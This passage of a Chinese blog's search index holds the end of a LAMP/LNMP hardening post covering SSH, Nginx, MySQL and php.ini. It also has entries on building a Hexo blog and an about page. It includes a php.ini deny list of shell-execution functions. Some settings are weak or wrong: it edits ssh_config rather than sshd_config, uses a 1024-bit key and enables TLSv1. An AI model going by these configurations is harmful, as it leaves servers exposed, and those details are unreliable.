&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span>        </span><br></pre></td></tr></table></figure><p>访问<code>127.0.0.1/connect.php</code>,页面上即出现“数据库连接成功！”，并执行mysql语句，返回了查询的数据。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805143905647.png" alt="image-20210805143905647"></p><h1 id="0x06-安全加固"><a href="#0x06-安全加固" class="headerlink" title="0x06 安全加固"></a>0x06 安全加固</h1><h2 id="加固Linux系统"><a href="#加固Linux系统" class="headerlink" title="加固Linux系统"></a>加固Linux系统</h2><p><strong>远程登陆</strong></p><p>在使用和管理服务器时，往往我们需要远程登陆服务器，这就需要我们保证远程登陆过程的安全性。以下步骤一定程度提高了远程登陆的安全性。</p><ol><li>强制使用高强度用户密码（数字、字母、字符的组合且长度14位以上）</li><li>更改 SSH 默认的端口（22）为随机端口</li><li>禁止 root 身份的远程登陆</li><li>使用公钥认证机制进行远程登陆</li><li>使用 Linux 标准用户而不是 root 用户执行上述操作，并且该用户的权限可提升成 root 权限</li></ol><p>现以 Ubuntu 系统为例，完成上述操作：</p><p>要强制用户<strong>使用高强度密码</strong>，需要安装额外的模块 <code>libpam-cracklib</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libpam-cracklib</span><br></pre></td></tr></table></figure><p>在 Ubuntu 中，密码策略（规定密码的长度，字符等）定义在 <code>/etc/pam.d/common-password</code> 文件中，如果要规定，密码长度为 14，包含大小写字符数字和字符，在文件中，在 <code>pam_unix.so</code>的前一行，添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password required pam_cracklib.so try_first_pass retry&#x3D;3 minlen&#x3D;14 lcredit&#x3D;-1 ucredit&#x3D;-1 dcredit&#x3D;-1 ocredit&#x3D;-1 difok&#x3D;2 reject_username</span><br></pre></td></tr></table></figure><p>上述配置的选项的描述如下，详情参考 <a href="http://www.linux-pam.org/Linux-PAM-html/sag-pam_cracklib.html">libpam-cracklib 文档</a>：</p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>retry=N</td><td>设置密码时的，最大重试次数</td></tr><tr><td>minlen=N</td><td>新密码的最小长度</td></tr><tr><td>lcredit=N</td><td>最少小写字母数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>ucredt=N</td><td>最少大写字母数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>dcredit=N</td><td>最少数字的数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>ocredit=N</td><td>最少其它字符数，小于0，正常计算 minlen，大于0，计算 minlen 额外加 1</td></tr><tr><td>difok=N</td><td>和旧密码不同的字符数</td></tr><tr><td>reject_username</td><td>禁止用户名作为密码</td></tr></tbody></table><p><strong>更改ssh默认端口，禁止root身份登录</strong>：</p><p>修改 ssh的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br></pre></td></tr></table></figure><p>找到 <code># Port 22</code> 更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port 2222</span><br></pre></td></tr></table></figure><p>找到 <code>#PermitRootLogin</code>，更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>保存后重启ssh服务，下次远程登陆时则需要指定该端口进行登陆，而且无法使用 root 用户登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip-addr -p 2222</span><br></pre></td></tr></table></figure><p><strong>使用公钥认证机制进行远程登陆：</strong></p><p>SSH 登陆 提供<a href="https://www.linode.com/docs/security/authentication/use-public-key-authentication-with-ssh/">公钥认证机制</a>的登陆，即不需要密码的登陆方式，但是需要客户端生成公钥和私钥，并将公钥发送给服务端，服务端将公钥添加到相应用户的配置文件中。</p><p>首先客户端需要生成密钥对：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure><p>使用默认文件名，一路 <strong>Enter</strong> 到底，生成的密钥对文件在 <code>~/.ssh/</code> 目录下，其中 <code>id_rsa</code> 为私钥，<code>id_rsa.pub</code> 为公钥。</p><p>接着将公钥文件上传到服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id username@ip-addr -p portnum</span><br></pre></td></tr></table></figure><p>该命令会把公钥文件的内容，写入到 <code>/home/username/ssh/authorized_keys</code> 文件中，也可以手动添加内容。如此一来就可以以 <code>username</code> 的身份，不使用密码登陆服务器了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 username@ip-addr</span><br></pre></td></tr></table></figure><h2 id="加固Nginx"><a href="#加固Nginx" class="headerlink" title="加固Nginx"></a>加固Nginx</h2><p><strong>防止信息泄露</strong></p><p>Nginx 默认开启 Server Token（显示版本号），这样使得 Nginx 的版本号很容易被获取，如下图为访问域名不存在资源时的返回页面，可以看到 Nginx 的版本号</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133453502.png" alt="image-20210304133453502"></p><p>在 <code>/etc/nginx/nginx.conf</code> 中 http 块中添加（去掉注释即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_tokens off</span><br></pre></td></tr></table></figure><p>关闭后，访问域名下不存在的资源，返回页面中没有了 Nginx 的版本号 信息。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133656320.png" alt="image-20210304133656320"></p><p><strong>增加访问控制策略</strong></p><p>Nginx 可以使用 <code>allow</code> 和 <code>deny</code> 指令在配置文件中允许或禁止特定 IP 的访问， 编辑 Niginx 配置文件 <code>/etc/nginx/conf.d/jaylen.com.conf</code>，例如只允许 192.168.47.129、192.168.47.130 访问此网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  server configuration</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80; </span><br><span class="line">    listen [::]:80;</span><br><span class="line"></span><br><span class="line">    # IPs access control</span><br><span class="line">    allow 192.168.47.129;</span><br><span class="line">    allow 192.168.47.130;</span><br><span class="line">    deny all;</span><br><span class="line">        </span><br><span class="line">    root &#x2F;var&#x2F;www&#x2F;html;</span><br></pre></td></tr></table></figure><p><strong>使用 TLS 加固 Nginx</strong></p><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TLS</a> 可以加密客户端和服务端通信的数据，降低信息泄露的风险。对于本地网站可以使用 <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">SSL 自签 证书</a> 实现 HTTPS 连接。当然在公网中使用的网站，通常会使用 CA 认证的证书，要免费使用 SSL 证书，可参考：</p><p><a href="https://www.howtoforge.com/tutorial/nginx-with-letsencrypt-ciphersuite/#step-install-letsencrypt-and-generate-certificates">How to Install Nginx with Let’s encrypt and get A+ from SSLLabs Test</a></p><p>要在 Nginx 配置自签证书，首先在配置目录下建一个文件夹，进到文件夹中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/nginx/ssl/</span><br><span class="line"><span class="built_in">cd</span> /etc/nginx/ssl</span><br></pre></td></tr></table></figure><p>生成密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl genrsa -aes256 -out nginx.key 1024</span><br></pre></td></tr></table></figure><p>接着生成 <a href="https://en.wikipedia.org/wiki/Certificate_signing_request">CSR</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl req -new -key nginx.key -out nginx.csr</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Enter pass phrase for nginx.key:</span><br><span class="line">Can&#39;t load &#x2F;home&#x2F;jaylen&#x2F;.rnd into RNG</span><br><span class="line">140067713049024:error:2406F079:random number generator:RAND_load_file:Cannot open file:..&#x2F;crypto&#x2F;rand&#x2F;randfile.c:88:Filename&#x3D;&#x2F;home&#x2F;jaylen&#x2F;.rnd</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#39;.&#39;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CN </span><br><span class="line">State or Province Name (full name) [Some-State]:Guangdong</span><br><span class="line">Locality Name (eg, city) []:Guangzhou</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:IT</span><br><span class="line">Organizational Unit Name (eg, section) []:IT</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:www.jaylen.com</span><br><span class="line">Email Address []:jaylen@gmail.com</span><br><span class="line"></span><br><span class="line">Please enter the following &#39;extra&#39; attributes</span><br><span class="line">to be sent with your certificate request</span><br><span class="line">A challenge password []:admin           </span><br><span class="line">An optional company name []:IT</span><br></pre></td></tr></table></figure><p>最后，签发证书：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl x509 -req -days 365 -<span class="keyword">in</span> nginx.csr -signkey nginx.key -out nginx.crt</span><br></pre></td></tr></table></figure><p>成功签发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ignkey nginx.key -out nginx.crt</span><br><span class="line">Signature ok</span><br><span class="line">subject&#x3D;C &#x3D; CN, ST &#x3D; Guangdong, L &#x3D; Guangzhou, O &#x3D; IT, OU &#x3D; IT, CN &#x3D; www.jaylen.com, emailAddress &#x3D; jaylen@gmail.com</span><br><span class="line">Getting Private key</span><br><span class="line">Enter pass phrase for nginx.key:</span><br></pre></td></tr></table></figure><p>接着在 <code>/etc/nginx/conf.d/jaylen.com.conf</code> 中修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl_certificate &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.crt;</span><br><span class="line">    ssl_certificate_key &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.key;</span><br><span class="line">    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br></pre></td></tr></table></figure><p>重新加载 Nginx 配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>提示输入之前步骤设置的密码，输入即可。</p><p>其它加固措施，可仔细阅读：</p><p><a href="https://www.cyberciti.biz/tips/linux-unix-bsd-nginx-webserver-security.html">Top 25 Nginx Web Server Best Security Practices</a></p><p><a href="https://geekflare.com/nginx-webserver-security-hardening-guide/">Nginx Web Server Security and Hardening Guide</a></p><h2 id="加固MySQL"><a href="#加固MySQL" class="headerlink" title="加固MySQL"></a>加固MySQL</h2><p>运行 <code>mysql_secure_installation</code> 工具（安装 mysql 后自带的 shell 脚本），进行 mysql 的安全检查，</p><p>根据提示，设置密码为最高级别，并为 root 用户设置密码，最后同意以下选项：</p><ul><li>Remove anonymous users? – 删除匿名用户</li><li>Disallow root login remotely? – 禁止远程使用 root 用户登陆</li><li>Remove test database and access to it? – 删除测试数据库和其访问权限</li><li>Reload privilege tables now? – 重载授权表</li></ul><h2 id="加固PHP"><a href="#加固PHP" class="headerlink" title="加固PHP"></a>加固PHP</h2><p><strong>当文件不存在时停止 PHP 处理</strong></p><p>Nginx 对于 PHP 的默认配置使得 PHP 解释器接受所有以 <code>.php</code>结尾的 URI，这样一来就会存在很大的风险，存在任意代码执行漏洞，具体解释见<a href="https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/?highlight=pitfalls#passing-uncontrolled-requests-to-php">Passing Uncontrolled Requests to PHP</a></p><p>修改 <code>/etc/php/7.4/fpm/php.ini</code>文件（不同系统该文件位置略有不同），设置<code>cgi.fix_pathinfo=0</code>，可以禁止 PHP 解释器查找文件系统中不存在的文件。</p><p><strong>禁用危险的 PHP 函数</strong></p><p>当以下函数不使用时，可修改 <code>php.ini</code> 以禁用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D;exec,eval,phpinfo,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span><br></pre></td></tr></table></figure><p><strong>限制文件上传功能</strong></p><p>如果网站不需要文件上传功能，应该禁用，修改<code>php.ini</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;Off</span><br></pre></td></tr></table></figure><p>如果需要上传功能，则设置上传文件的大小，根据实际情况设置，如头像图片上传1M足矣，修改<code>php.ini</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;On</span><br><span class="line">upload_max_filesize&#x3D;1M</span><br></pre></td></tr></table></figure><p><strong>设置 POST 方法传输数据的大小</strong></p><p>POST 方法是当客户端需要向服务器发送数据时使用的，该方法可被用于对服务器进行 Dos 攻击等，所以需要将其能传输的数据大小设置成合理的数值，如果网站不需要上传文件等数据量大的操作，4KB也应该足够了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_max_size&#x3D;1K</span><br></pre></td></tr></table></figure><p><strong>防止 PHP 信息泄露</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose_php &#x3D; Off</span><br></pre></td></tr></table></figure><p><strong>限制 PHP 脚本的最长执行时间</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># set in seconds</span><br><span class="line">max_execution_time &#x3D; 30 #最长执行时间 30 s</span><br><span class="line">max_input_time &#x3D; 30#脚本解析输入最长时间30s</span><br><span class="line">memory_limit &#x3D; 40M #脚本最大使用内存40M</span><br></pre></td></tr></table></figure><p>这样可以有效防止大规模的 DOS 攻击。</p><p><strong>禁用未使用的 PHP 模块</strong></p><p>查看已安装的 PHP 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -m</span><br></pre></td></tr></table></figure><p>根据实际情况，禁用不使用模块，注释掉 <code>php.ini</code>相应的配置行即可。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人博客搭建记录</title>
      <link href="posts/50074.html"/>
      <url>posts/50074.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>博客经过几代更迭，现在确定下来，不再更改了，静心学习，好好写博客才是正道。</p><p>此博客由 <a href="https://hexo.io/zh-cn/">Hexo</a> 框架搭建，使用 <a href="https://butterfly.js.org/">Butterfly</a> 主题，托管于 <a href="https://github.com/">Github</a> 和 <a href="https://vercel.com/">Vercel</a> ，<a href="https://www.upyun.com/">又拍云</a>提供CDN加速和对象存储服务。</p><h1 id="安装Hexo框架"><a href="#安装Hexo框架" class="headerlink" title="安装Hexo框架"></a>安装Hexo框架</h1><p>Hexo 是一个快速、简洁且高效的博客框架。</p><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="http://nodejs.org/">Node.js</a> </li><li><a href="http://git-scm.com/">Git</a></li></ul><p>这两个必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装 Hexo 完成后，新建一个文件夹用于存放博客相关文件。执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure><p>完成后执行以下命令，生成静态页面，访问 <code>localhost:4000</code> 可进行预览。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><p><img src="https://cdn.wawyw.top/images/1-hexo.png" alt="1-hexo"></p><h1 id="使用Bufferfly主题"><a href="#使用Bufferfly主题" class="headerlink" title="使用Bufferfly主题"></a>使用Bufferfly主题</h1><p>在<a href="https://hexo.io/themes/">Heox官网的主题页面</a>选择一个满意的主题。我选择了Butterfly主题，然后根据文档说明直接配置主题即可。</p><p>安装主题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><p>应用主题，修改站点配置文件<code>_config.yml</code>，把主题选择改为<code>butterfly</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p>安装相关插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>在一定修改后通过以下命令来查看应用主题后的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  #清理缓存文件</span><br><span class="line">hexo g  #生成静态页面</span><br><span class="line">hexo s  #重启本地服务器</span><br></pre></td></tr></table></figure><p>访问 <code>localhost:4000</code> ，可以看到更新后的主题页面。</p><p><img src="https://cdn.wawyw.top/images/1-bufferfly.png" alt="1-bufferfly"></p><p>更多的主题美化操作，可以参考主题文档来配置。</p><h1 id="部署到Github"><a href="#部署到Github" class="headerlink" title="部署到Github"></a>部署到Github</h1><ol><li><p>新建仓库，将仓库名设置为 <code>username.github.io</code>  <strong>(username对应github用户名)</strong></p><p>接下来使用git把本地的博客文件上传到github仓库。如果第一次使用git的话，需要绑定用户名和邮箱。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;your username&quot;</span><br><span class="line">git config --global user.email &quot;your email&quot;</span><br></pre></td></tr></table></figure><p>将上述的“your username”换成github用户名,”your email”换成注册github的邮箱地址。</p><p>然后，生成公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>在C盘/用户/用户名/.ssh目录下找到<code>id_rsa.pub</code>文件,用文本编辑工具打开，并复制所有文本内容。</p><p>在Github页面右上角，点击用户头像-Settings-SSH and GPG keys-New SSH key</p><p>把复制的公钥文本内容粘贴到Key中，上方的Title可随意填写</p><p>添加完成后执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果配置成功，可以看到成功的回复。</p></li><li><p>在上传之前，需要在配置文件<code>_config.yml</code>中添加仓库信息</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="comment">#你的仓库地址,如:https://github.com/wawyw/wawyw.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></li><li><p>直接通过hexo部署到github，需要安装以下插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>安装成功后，执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure></li><li><p>刷新github对应的repository页面，即可看到提交的博客文件。</p></li><li><p>接下来配置静态站点。</p></li></ol><p>点击Settings, 进入GitHub Pages配置，由于之前新建仓库的时候，仓库名为username.github.io，github已经自己为我们发布了静态的页面。如果不是username.github.io的格式，则需要手动配置。</p><p>之后访问<code>username.github.io</code>可在线看到博客站点。</p><p>更换域名只要把个人域名解析到<code>username.github.io</code>。</p><h1 id="部署到Vercel"><a href="#部署到Vercel" class="headerlink" title="部署到Vercel"></a>部署到Vercel</h1><blockquote><p><a href="https://vercel.com/">vercel</a>类似于github page，但远比github page强大，速度也快得多得多，而且将Github授权给vercel后，可以达到最优雅的发布体验，只需将代码轻轻一推，项目就自动更新部署了。</p></blockquote><ol><li>使用github账号登陆到vercel</li><li>在vercel的Overview菜单下，点击按钮 New Project</li><li>在Import Git Repository选项下，选择含博客文件的那个仓库，Import</li><li>继续，点击Deploy按钮，vercel就开始构建了</li><li>构建完之后，可以在Overview菜单下，看到新建的项目,至此项目已经创建完成，可以通过vercel自动配置的域名访问了</li></ol><p>设置自定义域名：</p><ul><li>点击Settings-&gt;Domains，并在输入框中填入想设置的域名，点击Add按钮</li><li>到域名控制台添加对应的解析记录</li><li>添加完之后，变成如图的样子则解析正确</li></ul><p><img src="https://cdn.wawyw.top/images/1-vercel.png" alt="1-vercel"></p><p>接下来就可以通过我们设置的域名访问我们的博客网站了！</p><p>后面需要更新网站，只需要往github上提交新的commit，vercel就会自动重新构建了！</p><h1 id="使用又拍云CDN"><a href="#使用又拍云CDN" class="headerlink" title="使用又拍云CDN"></a>使用又拍云CDN</h1><p>到CDN服务管理处，创建服务，如下设置</p><p><img src="https://cdn.wawyw.top/images/1-upyun.png" alt="1-upyun"></p><p>添加CNAME记录</p><p><img src="https://cdn.wawyw.top/images/1-upyun1.png"></p><p>若Ping域名，后缀显示为 aicdn.com，则证明CNAME配置生效，加速服务已启用。</p><p><img src="https://cdn.wawyw.top/images/1-upyun2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 博客记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="manifest.json"/>
      <url>manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="about/index.html"/>
      <url>about/index.html</url>
      
        <content type="html"><![CDATA[<div class='tip success'><p>欢迎来到我的博客，这是一个记录学习的地方，像我这样的废物需要多记✍<p></div><div class='tip info'><p>小站的大部分美化、魔改来自（白嫖）于大佬们的博客，感谢分享！🎨<p></div><div class='tip warning'><p>博客中的部分文字、图片来源于网络，如有侵权，请联系删除。🚫<p></div><div class="tip ffa font5 fas fa-cogs"><p><del>永远相信美好的事情即将发生！</del>偶尔搬砖，日常摸鱼ing...🐟</p><p></p></div><h1>个人简介</h1><div class="checkbox cyan">  <input type="radio" />    <p><del>大一</del>大二student，坐标🌏陕西西安</p></div><div class="checkbox blue">  <input type="radio" />  <p>努力学习网络安全的小白</p></div><div class="checkbox yellow">  <input type="radio" />  <p>Mail：MjE5NzMzMTU0MEBxcS5jb20=</p></div><h1>2022のflag</h1><div class="checkbox green checked">  <input type="checkbox" checked />  <p>按时睡觉，规律作息</p></div><div class="checkbox blue checked">  <input type="checkbox" checked />  <p>坚持锻炼，静心学习</p></div><div class="checkbox yellow checked">  <input type="checkbox" checked />  <p>→ctf、→hvv、→实习</p></div><div class="checkbox red checked">  <input type="checkbox" checked />  <p>不做积极废人</p></div><div class="checkbox cyan checked">  <input type="checkbox" checked />  <p>做比昨天更好的自己</p></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>朋友圈</title>
      <link href="fcircle/index.html"/>
      <url>fcircle/index.html</url>
      
        <content type="html"><![CDATA[<div id="moments_container" ></div><script src="moments.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>👉Do you want to know?👈</title>
      <link href="secret/index.html"/>
      <url>secret/index.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="0847dfe03054acd116027e1ec127cfeb5cc7594e767f81e2e0bb1d8f30df41e8">e72224b5b91b43f86582a683301246bbb1a6ebf43171e06271fc23f7920c5989e78877de5d9b3e70adc34885242b985a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="link/index.html"/>
      <url>link/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="我的Blog信息"><a href="#我的Blog信息" class="headerlink" title="我的Blog信息"></a>我的Blog信息</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">wawyw</span></span><br><span class="line">  <span class="attr">link:</span> <span class="string">https://www.wawyw.top/</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">https://www.wawyw.top/avatar.webp</span></span><br><span class="line">  <span class="attr">descr:</span> <span class="string">活在当下</span> <span class="string">顺势而为</span></span><br></pre></td></tr></table></figure><div class='tip info'><p>欢迎交换友链🚀<p></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>碎碎念</title>
      <link href="speak/index.html"/>
      <url>speak/index.html</url>
      
        <content type="html"><![CDATA[<p>​<br>​<br>​<br>​        </p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>法律法规</title>
      <link href="law/index.html"/>
      <url>law/index.html</url>
      
